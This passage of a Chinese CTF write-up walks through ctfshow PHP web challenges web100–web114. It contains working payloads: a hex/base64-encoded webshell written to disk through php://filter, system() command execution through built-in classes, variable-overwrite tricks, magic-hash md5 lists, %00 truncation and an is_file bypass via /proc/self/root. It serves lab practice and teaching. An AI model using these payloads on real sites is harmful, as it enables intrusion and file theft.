<p>得到 flag_is_bde4fb430x2d62590x2d404f0x2dbaa30x2da2d6bd94ed98<br><code>把ox2d换成-，再套上ctfshow&#123;&#125;即可</code></p>
<p>注意这里v3只能包含;，可以是多个叠加，但不能有其他字符。</p>
<h2 id="利用var-dump的解法："><a href="#利用var-dump的解法：" class="headerlink" title="利用var_dump的解法："></a>利用var_dump的解法：</h2><p>var_dump() 函数用于输出变量的相关信息。</p>
<p>构造:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?v1=<span class="number">1</span>&amp;v2=<span class="title function_ invoke__">var_dump</span>(<span class="variable">$ctfshow</span>)<span class="comment">/*&amp;v3=*/</span>;</span><br><span class="line">?v1=<span class="number">1</span>&amp;v2=<span class="title function_ invoke__">var_dump</span>(<span class="variable">$ctfshow</span>)&amp;v3=;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>两种方法均可，原理是直接打印ctfshow类的信息。</p>
<h1 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h1><p>这题在web100的基础上过滤了很多东西</p>
<p>反射一下类即可，new ReflectionClass</p>
<p>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?v1=<span class="number">1</span>&amp;v2=<span class="keyword">echo</span> <span class="keyword">new</span> ReflectionClass&amp;v3=;</span><br></pre></td></tr></table></figure>


<p>可以得到flag，但是要爆破16次flag少给一位。</p>
<h1 id="web102-103"><a href="#web102-103" class="headerlink" title="web102-103"></a>web102-103</h1><h3 id="hex2bin-函数"><a href="#hex2bin-函数" class="headerlink" title="hex2bin()函数"></a>hex2bin()函数</h3><p><strong>作用</strong>:把十六进制值转换为 ASCII 字符</p>
<h3 id="substr-函数"><a href="#substr-函数" class="headerlink" title="substr() 函数"></a>substr() 函数</h3><p>语法:**substr(string,start,length)**如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="string">&quot;Hello world&quot;</span>,<span class="number">6</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>则输出从第六位开始，即输出”world”</p>
<h3 id="call-user-func-函数"><a href="#call-user-func-函数" class="headerlink" title="call_user_func()函数"></a>call_user_func()函数</h3><p>语法:<strong>call_user_func(PHP 4, PHP 5, PHP 7)</strong></p>
<p>第一个参数作为回调函数调用,其余参数是回调函数的参数。</p>
<p>源码:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v4</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v4</span>)&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$v2</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$v1</span>,<span class="variable">$s</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$v3</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>is_numeric在php5的环境中，是可以识别十六进制的。</p>
<p>先把一句话编码成十六进制传给v2:</p>
<p><code>&lt;?php eval($_POST[1]);?&gt;</code>变为<code>0x3c3f706870206576616c28245f504f53545b315d293b3f3e</code></p>
<p>构造:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?v2=<span class="number">0x3c3f706870206576616c28245f504f53545b315d293b3f3e</span>&amp;v3=<span class="number">1</span>.php</span><br><span class="line">v1=hex2bin</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>但是没有成功写入，参考了大佬的博客，得知这里的版本可能是php7，这一串十六进制不能被is_numeric()识别成数字，v2必须由纯数字构成。</p>
<p>这里用大佬的payload:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$a=<span class="string">&#x27;&lt;?=`cat *`;&#x27;</span>;</span><br><span class="line">$b=base64_encode($a);  // PD89YGNhdCAqYDs=</span><br><span class="line">$c=bin2hex($b);      //这里直接用去掉=的base64</span><br><span class="line">输出   <span class="number">5044383959474e6864434171594473</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>带e的话会被认为是科学计数法，可以通过is_numeric检测。<br />大家可以尝试下去掉&#x3D;和带着&#x3D;的base64解码出来的内容是相同的。因为等号在base64中只是起到填充的作用，不影响具体的数据内容。</p>
<p>同时因为经过substr处理，所以v2前面还要补两位任意数字，这里使用00</p>
<p>最终构造:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">v2=<span class="number">005044383959474e6864434171594473</span>&amp;v3=php:<span class="comment">//filter/write=convert.base64-decode/resource=1.php </span></span><br><span class="line"></span><br><span class="line">post: v1=hex2bin</span><br></pre></td></tr></table></figure>


<p>访问1.php，查看源码得到flag</p>
<h1 id="web104"><a href="#web104" class="headerlink" title="web104"></a>web104</h1><p>数组绕过</p>
<h1 id="web105"><a href="#web105" class="headerlink" title="web105"></a>web105</h1><p>变量覆盖</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="variable">$flag</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$error</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GET: ?suces=flag </span><br><span class="line">POST: error=suces</span><br></pre></td></tr></table></figure>


<p>先分析这个get请求:</p>
<p>当传入suces&#x3D;flag时，实际上执行的是$suces&#x3D;$flag<br />即把flag赋值给了suces变量</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span>===<span class="string">&#x27;error&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>再看post请求:</p>
<p>传入error&#x3D;suces,得到error&#x3D;$suces&#x3D;$flag </p>
<p>即成功把flag的值赋给了error变量</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$value</span>===<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>所以能成功回显出flag</p>
<p>可以看到在这个过程中,suces变量只是起到了一个传递的作用，所以可以被任意替换，即</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GET: ?a=flag </span><br><span class="line">POST: error=a</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web106"><a href="#web106" class="headerlink" title="web106"></a>web106</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GET: ?v2[]=a </span><br><span class="line">POST: v1[]=b</span><br></pre></td></tr></table></figure>


<h1 id="web107-parse-str变量覆盖"><a href="#web107-parse-str变量覆盖" class="headerlink" title="web107(parse_str变量覆盖)"></a>web107(parse_str变量覆盖)</h1><h2 id="parse-str"><a href="#parse-str" class="headerlink" title="parse_str()"></a>parse_str()</h2><p>parse_str() 函数把查询字符串解析到变量中。</p>
<p>注释:如果未设置 array 参数，则由该函数设置的变量将覆盖已存在的同名变量。</p>
<p>注释:php.ini 文件中的 magic_quotes_gpc 设置影响该函数的输出。如果已启用，那么在 parse_str() 解析之前，变量会被 addslashes() 转换。</p>
<ul>
<li>Parse_str()函数引起的变量覆盖漏洞<br>  <code>parse_str() </code>函数用于把查询字符串解析到变量中，如果没有<code>array 参数</code>，则由该函数设置的变量将覆盖已存在的同名变量。 极度不建议 在没有 array参数的情况下使用此函数，并且在 PHP 7.2 中将废弃不设置参数的行为。此函数没有返回值</li>
</ul>
<p>要得到flag，需要v2中flag的值与传入v3的md5的值相同:</p>
<p>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">get：?v3=<span class="number">1</span></span><br><span class="line">post:v1=flag=c4ca4238a0b923820dcc509a6f75849b <span class="comment">#md5解密后对应1</span></span><br></pre></td></tr></table></figure>


<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">0x01</span> <span class="title function_ invoke__">md5</span>(str)</span><br><span class="line"> </span><br><span class="line">QNKCDZO</span><br><span class="line"><span class="number">0e830400451993494058024219903391</span></span><br><span class="line">  </span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line">  </span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">  </span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line">  </span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line">  </span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line">  </span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">  </span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line">  </span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line">  </span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line">  </span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line">  </span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">  </span><br><span class="line">s1184209335a</span><br><span class="line"><span class="number">0e072485820392773389523109082030</span></span><br><span class="line">  </span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line">  </span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line">  </span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line">  </span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">  </span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">  </span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line">  </span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">  </span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line">  </span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">  </span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">  </span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line">  </span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line">  </span><br><span class="line">s532378020a</span><br><span class="line"><span class="number">0e220463095855511507588041205815</span></span><br><span class="line">  </span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line">  </span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">  </span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line">  </span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line">  </span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">  </span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line">  </span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line">  </span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line">  </span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line">  </span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="number">0x02</span> <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>())</span><br><span class="line">  </span><br><span class="line"><span class="number">0x03</span> <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(str).<span class="string">&quot;SALT&quot;</span>)</span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">0e774261293712168181959463563504</span></span><br></pre></td></tr></table></figure>


<h2 id="web108-00截断"><a href="#web108-00截断" class="headerlink" title="web108(%00截断)"></a>web108(%00截断)</h2><h3 id="ereg-函数"><a href="#ereg-函数" class="headerlink" title="ereg()函数"></a>ereg()函数</h3><p>ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。</p>
<p>可选的输入参数规则包含一个数组的所有匹配表达式,他们被正则表达式的括号分组。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ereg</span> (<span class="string">&quot;^[a-zA-Z]+$&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>])===<span class="literal">FALSE</span>)  &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//只有36d的人才能看到flag</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">strrev</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))==<span class="number">0x36d</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>这题限制c只能是<strong>一个或多个大小写字母</strong>。</p>
<h3 id="strrev-函数"><a href="#strrev-函数" class="headerlink" title="strrev()函数"></a>strrev()函数</h3><p>strrev() 函数反转字符串。</p>
<h3 id="intval-函数"><a href="#intval-函数" class="headerlink" title="intval()函数"></a>intval()函数</h3><p>intval() 函数用于获取变量的整数值。</p>
<p>这题同时又要求c反转后与0x36d相等，同时满足这两点，需要用到%00截断。</p>
<p>最终payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=a%<span class="number">00778</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web109-Exception-异常处理类"><a href="#web109-Exception-异常处理类" class="headerlink" title="web109(Exception 异常处理类)"></a>web109(<a href="http://c.biancheng.net/view/6253.html">Exception 异常处理类</a>)</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>第九行新增一个类，那肯定是内置类</p>
<p>v2哪里又出现一个括号，说明是把它当作一个函数来调用，使用一个有回显的内置类给V1，V2RCE即可。</p>
<p>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?v1=<span class="built_in">Exception</span>&amp;v2=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat fl36dg.txt&#x27;</span>)</span><br><span class="line">?v1=ReflectionClass&amp;v2=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat fl36dg.txt&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p><strong>payload:</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?v1=<span class="built_in">FilesystemIterator</span>&amp;v2=getcwd</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>构造后回显一个<code>fl36dga.txt</code>，访问得到flag</p>
<p><strong>原理：</strong></p>
<h3 id="FilesystemIterator"><a href="#FilesystemIterator" class="headerlink" title="FilesystemIterator"></a>FilesystemIterator</h3><p>获取指定目录下的所有文件</p>
<h2 id="getcwd-函数"><a href="#getcwd-函数" class="headerlink" title="getcwd()函数"></a>getcwd()函数</h2><p>获取当前工作目录 返回当前工作目录</p>
<h1 id="web111"><a href="#web111" class="headerlink" title="web111"></a>web111</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params">&amp;<span class="variable">$v1</span>,&amp;<span class="variable">$v2</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;$<span class="subst">$v1</span> = &amp;$<span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$$v1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">getFlag</span>(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>这里给v1和v2赋值，然后v2的值又会赋给v1，覆盖v1原来的值</p>
<h3 id="超全局变量-GLOBALS"><a href="#超全局变量-GLOBALS" class="headerlink" title="超全局变量$GLOBALS"></a>超全局变量$GLOBALS</h3><p>官方说明</p>
<ol>
<li>$GLOBALS — 引用全局作用域中可用的全部变量。</li>
<li>一个包含了全部变量的全局组合数组。变量的名字就是数组的键。</li>
<li>即出现过的全局变量，就可以通过$GLOBALS这个数组取得。</li>
<li>PHP生命周期中，定义在函数体外部的所谓全局变量，函数内部是不能直接获得的。<br>payload: <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?v1=ctfshow&amp;v2=GLOBALS</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="web112"><a href="#web112" class="headerlink" title="web112"></a>web112</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Firebasky</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-30 23:47:49</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\.\.\/|http|https|data|input|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>直接用filter伪协议读取文件即可:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/resource=flag.php</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h1><p>和web112相比，多了一个限制条件<code>filter</code><br>这里可以用web112给出的姿势</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=compress.zlib:<span class="comment">//flag.php</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>超过20次软连接后就可以绕过is_file</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/p</span><br><span class="line">roc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/pro</span><br><span class="line">c/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/</span><br><span class="line"><span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/se</span><br><span class="line">lf/root/proc/<span class="built_in">self</span>/root/<span class="keyword">var</span>/www/html/flag.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h1><p>这题把compress这些过滤了，但是把filter放出来了。。。</p>
